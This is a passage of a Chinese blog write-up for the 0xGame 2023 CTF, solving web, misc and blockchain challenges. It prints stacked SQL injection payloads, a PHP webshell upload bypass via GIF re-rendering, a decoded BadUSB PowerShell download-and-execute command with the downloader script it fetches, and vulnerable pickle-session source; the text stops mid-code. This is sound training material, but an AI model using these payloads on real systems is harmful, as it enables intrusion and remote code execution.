alt="image-20231022200017329"></p><p><img src="/2023/10/22/0xGameCTF2023/image-20231022200028840-1697984568875-54.png" alt="image-20231022200028840"></p><p>选择Injected Provider - MetaMask，这边注意networks的id是否一样，然后在At Address中输入前面的合约地址：<code>0x70542C6d259fff7bB329B077Ea7131e08A242645</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697976070873-1697984613278-58.png" alt="1697976070873"></p><p>下面填<code>Love0xGame</code></p><p>然后点击<code>transact</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697976103761-1697984593423-56.png" alt="1697976103761"></p><p>最后在题目那边输入3，填写创建账号的token，得到flag</p><p><code>0xGame&#123;a4a1e006-42f1-44f9-a4c5-6c712a930664&#125;</code></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>过滤了一堆函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">import</span> MySQLdb<br><span class="hljs-keyword">import</span> re<br><br>blacklist = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;database&#x27;</span>, <span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;column&#x27;</span>, <span class="hljs-string">&#x27;alter&#x27;</span>, <span class="hljs-string">&#x27;create&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;xor&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;then&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>]<br><br>conn = MySQLdb.connect(host=<span class="hljs-string">&#x27;db&#x27;</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, passwd=<span class="hljs-string">&#x27;root&#x27;</span>, db=<span class="hljs-string">&#x27;ctf&#x27;</span>)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    field = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>)<br>    field = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, field)<br><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> s.lower() <span class="hljs-keyword">in</span> field.lower():<br>            <span class="hljs-keyword">return</span> s + <span class="hljs-string">&#x27; are banned&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;id|name|email&quot;</span>, field):<br>        field = <span class="hljs-string">&#x27;id&#x27;</span><br><br>    <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>        cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM userinfo order by %s&#x27;</span> % field)<br>        res = cursor.fetchall()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, res=res)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br>?order=<span class="hljs-built_in">id</span>,extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x6461746162617365</span>))%<span class="hljs-number">00</span><br><span class="hljs-built_in">id</span>,extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()))%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>payload：使用<code>/**/</code>替代空格，hint提示用堆叠注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">order</span>=id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span>@a=concat(&quot;sel&quot;,&quot;ect/**/extractvalue(1,concat(0x7e,(se&quot;,&quot;lect/**/substr(flag,1,32)/**/from/**/flag)))&quot;);<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>execsql<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>@a;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>execsql;<br>?<span class="hljs-keyword">order</span>=id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span>@a=concat(&quot;sel&quot;,&quot;ect/**/extractvalue(1,concat(0x7e,(se&quot;,&quot;lect/**/substr(flag,30,32)/**/from/**/flag)))&quot;);<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>execsql<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>@a;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>execsql;<br><span class="hljs-number">0</span>xGame&#123;<span class="hljs-number">4286</span>b62d-c37e<span class="hljs-number">-4010</span>-ba9c<span class="hljs-number">-35</span>d47641fb91&#125;<br></code></pre></td></tr></table></figure><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>  <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>);<br>&#125;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>  <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>  <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>  <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>  <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>  <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>  <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>  <span class="hljs-keyword">break</span>;<br>  <span class="hljs-keyword">default</span>:<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>] = <span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据<code>$ext = pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;], PATHINFO_EXTENSION);</code></p><p><code>$filepath = $user_dir.md5($_FILES[&#39;file&#39;][&#39;name&#39;]).&#39;.&#39;.$ext;</code>可以知道，我们可以更改文件名后缀，因为<code>pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;], PATHINFO_EXTENSION);</code>只返回最后一个点号后面的后缀（如果文件是a.gif.php就返回php）,然后根据<code>$filepath = $user_dir.md5($_FILES[&#39;file&#39;][&#39;name&#39;]).&#39;.&#39;.$ext;</code>拼接到新文件的末尾。我们先根据图片二次渲染的文件上传知识点做一个一句话木马，具体可以参考</p><p><a href="https://blog.csdn.net/qq_40800734/article/details/105920149">https://blog.csdn.net/qq_40800734/article/details/105920149</a></p><p>使用<code>gif</code>相对简单</p><p>上传一个<code>gif</code>，再下载上传后渲染过的<code>gif</code></p><p>在<code>010</code>中进行对比，找出渲染前后不变的地方，写入木马</p><p><img src="/2023/10/22/0xGameCTF2023/1697974779434-1697984134971-10.jpg" alt="1697974779434"></p><p>抓包修改后缀<code>.php</code></p><p>蚁剑连接即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">4611</span>f622-<span class="hljs-number">8577</span>-<span class="hljs-number">4</span>ac4-<span class="hljs-number">8</span>f85-<span class="hljs-number">0</span>b787730800c&#125;<br></code></pre></td></tr></table></figure><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="notverybadusb"><a href="#notverybadusb" class="headerlink" title="notverybadusb"></a>notverybadusb</h3><blockquote><p>我借来朋友的电脑说要拷贝点东西，但是我掏出的u盘有点奇怪？请提交所下载软件(evil.exe)的MD5值并包上0xGame{}作为flag，md5值以ece开头</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python pcap2text.py [-h] pcapng_file<br></code></pre></td></tr></table></figure><p><img src="/2023/10/22/0xGameCTF2023/1697976268956-1697984644463-60.png" alt="1697976268956"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-string">&#x27;dlRCMD\nPOWERSHELL _WINDOWSTYLE HIDDEN IEX (NEW_OBJECT NET&gt;WEBCLIENT)&gt;DOWNLOADSTRING(&quot;HTTP:??ZYSGMZB&gt;CLUB?HELLO?NOTVERYEVIL&gt;PS!&quot;):\ndlgg&#x27;</span><br>Text output:<br>dlRCMD<br>POWERSHELL _WINDOWSTYLE <span class="hljs-keyword">HIDDEN</span> <span class="hljs-built_in">IEX</span> (NEW_OBJECT NET&gt;WEBCLIENT)&gt;DOWNLOADSTRING(<span class="hljs-string">&quot;HTTP:??ZYSGMZB&gt;CLUB?HELLO?NOTVERYEVIL&gt;PS!&quot;</span>):<br>dlgg<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">HTTP</span><span class="hljs-symbol">:<span class="hljs-string">??</span>ZYSGMZB&gt;CLUB?HELLO?NOTVERYEVIL&gt;PS!</span><br></code></pre></td></tr></table></figure><p>猜测是<code>HTTP://ZYSGMZB.CLUB/HELLO/NOTVERYEVIL.PS1</code></p><p>下载，用记事本打开</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$userHome</span> = <span class="hljs-variable">$env</span>:USERPROFILE<br><br><span class="hljs-variable">$savePath</span> = Join-Path -Path <span class="hljs-variable">$userHome</span> -ChildPath <span class="hljs-string">&quot;Desktop\evil.exe&quot;</span><br><br><span class="hljs-variable">$downloadUrl</span> = <span class="hljs-string">&quot;https://autopatchcn.bhsr.com/client/cn/20230811104659_pn5QBAAp94eSn89l/StarRail_setup_gw_20230828.exe&quot;</span><br><br><span class="hljs-variable">$webClient</span> = New-Object System.Net.WebClient<br><span class="hljs-variable">$webClient</span>.DownloadFile(<span class="hljs-variable">$downloadUrl</span>, <span class="hljs-variable">$savePath</span>)<br><br><span class="hljs-keyword">if</span> (Test-Path <span class="hljs-variable">$savePath</span>) &#123;<br>    Start-Process -FilePath <span class="hljs-variable">$savePath</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">exit</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>https://autopatchcn.bhsr.com/client/cn/20230811104659_pn5QBAAp94eSn89l/StarRail_setup_gw_20230828.exe</code>下了一个星穹铁道</p><p><img src="/2023/10/22/0xGameCTF2023/1697976339175-1697984656590-62.png" alt="1697976339175"></p><p>0xGame{ece22dea2b0c6c7f3857164344ad94b4}</p><h3 id="findme-2"><a href="#findme-2" class="headerlink" title="findme-2"></a>findme-2</h3><blockquote><p>我们的老朋友WearyMeadow听说0xGame2023开始了，和zysgmzb进行了一手小小的py提前拿到了第二周的所有题目，然后顺手写了Misc部分的wp发到博客里，为了防止上次的情况再次发生，他把github里的密码全删了，这次应该安全了</p></blockquote><p>搜索一下</p><p><img src="/2023/10/22/0xGameCTF2023/1697976380637-1697984671187-64.png" alt="1697976380637"></p><p>不出意外又要密码，看到github上有一个自动登录的脚本，打开看一下</p><p><img src="/2023/10/22/0xGameCTF2023/1697976406868-1697984688152-66.png" alt="1697976406868"></p><p>看历史记录</p><p><img src="/2023/10/22/0xGameCTF2023/1697976457462-1697984697349-68.png" alt="1697976457462"></p><p><code>password=&quot;WearyMeadowssecretp@ss&quot;</code></p><p>输入密码得到<code>0xGame&#123;OHHHH_You_Find_Me_%%%&#125;</code></p><h3 id="8848"><a href="#8848" class="headerlink" title="8848"></a>8848</h3><p>给了附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> pyzipper<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setzip</span>():<br>    zipfile = pyzipper.AESZipFile(<span class="hljs-string">&#x27;8848.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES)<br>    password = <span class="hljs-string">&quot;very_very_very_very_long_password_which_cannot_be_cracked_easily_and_will_never_be_known_to_anyone&quot;</span><br>    zipfile.setpassword(password.encode())<br>    zipfile.write(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br>    zipfile.close()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trydecode</span>(<span class="hljs-params">password</span>):<br>    <span class="hljs-keyword">with</span> pyzipper.AESZipFile(<span class="hljs-string">&#x27;8848.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="hljs-keyword">as</span> extracted_zip:<br>        <span class="hljs-keyword">try</span>:<br>            extracted_zip.extractall(pwd=password)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Success!&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The flag is: &quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-built_in">print</span>(f.read())<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong password!&quot;</span>)<br>            exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checker</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(text) &gt; <span class="hljs-number">30</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Too long!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    setzip()<br>    password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input the base64-encoded password to decompress the 8848.zip: &quot;</span>)<br>    checker(password)<br>    <span class="hljs-keyword">try</span>:<br>        password = base64.b64decode(password)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;invalid base64 string!&#x27;</span>)<br>        exit()<br>    trydecode(password)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>zip长密码</p><p>ZIP 使用 PBKDF2，如果输入太大,它会 hash 输入 。该 hash（作为原始字节）成为实际密码。尝试使用 <code>SHA1 </code>对第一个密码进行 hash，并将十六进制摘要解码为<code> ASCII</code></p><p><img src="/2023/10/22/0xGameCTF2023/1697976510976-1697984727748-70.png" alt="1697976510976"></p><p><img src="/2023/10/22/0xGameCTF2023/1697976526674-1697984730893-72.png" alt="1697976526674"></p><p>payload：<code>SB05O+omkrB9vUYzyvrqA1LSZtg=</code></p><p><code>0xGame&#123;B07h_z1p_&amp;_8848_Can_h4v3_Two_P@ssw0rds&#125;</code></p><h3 id="勇者的奇妙冒险"><a href="#勇者的奇妙冒险" class="headerlink" title="勇者的奇妙冒险"></a>勇者的奇妙冒险</h3><blockquote><p>Hint 1: 似乎勇者还会点分身术<br>Hint 2: 也许勇者可以先放个分身在起点，自己拿到flag之后再传送回来</p></blockquote><p>用同样的账号名，开两个终端，一个在原地，一个走到中点，在原地的那边可以得到flag</p><p><img src="/2023/10/22/0xGameCTF2023/1697976701528-1697984747384-74.png" alt="1697976701528"></p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h3><p>先看一波源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()//表示用来加密session的serect_key是用两个字符的<span class="hljs-number">16</span>进制表示的，可以爆破<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, content</span>):<br>        self._name = name<br>        self._content = content<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">content</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_note</span>(<span class="hljs-params">note_id</span>):<br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    note_raw = notes.get(note_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    note = pickle.loads(note_raw)//存在pickle反序列化漏洞，可以伪造session<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, note_id=note_id, note_name=note.name, note_content=note.content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_note</span>():<br>    note_name = request.form.get(<span class="hljs-string">&#x27;note_name&#x27;</span>)<br>    note_content = request.form.get(<span class="hljs-string">&#x27;note_content&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;note name or content is empty&#x27;</span>)<br>    <br>    note_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    note = Note(note_name, note_content)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;notes&#x27;</span>):<br>        session[<span class="hljs-string">&#x27;notes&#x27;</span>] = &#123;&#125;<br>    <br>    notes = session[<span class="hljs-string">&#x27;notes&#x27;</span>]<br>    notes[note_id] = pickle.dumps(note)<br>    session[<span 